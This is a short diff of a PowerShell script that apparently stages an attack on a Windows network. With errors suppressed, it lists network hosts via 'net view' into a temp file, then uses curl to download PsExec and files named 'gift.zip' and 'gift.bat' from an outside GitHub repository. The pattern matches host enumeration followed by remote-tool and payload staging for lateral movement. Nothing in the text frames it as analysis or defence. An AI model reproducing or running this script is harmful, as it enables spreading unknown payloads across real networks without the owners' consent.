@@ -1,6 +1,7 @@
 $ErrorActionPreference="SilentlyContinue"
 cd $env:temp
-(Get-AdComputer -Filter *).Name | Out-File $env:temp\computers.txt; type $env:temp\computers.txt_
+#(Get-AdComputer -Filter *).Name | Out-File $env:temp\computers.txt; type $env:temp\computers.txt
+net view > $env:temp\computers.txt
 curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\psexec.exe
 curl https://github.com/d77juan/t3st1n6/raw/main/gift.zip -o $env:temp\gift.zip
 curl https://github.com/d77juan/t3st1n6/raw/main/gift.bat -o $env:temp\gift.bat
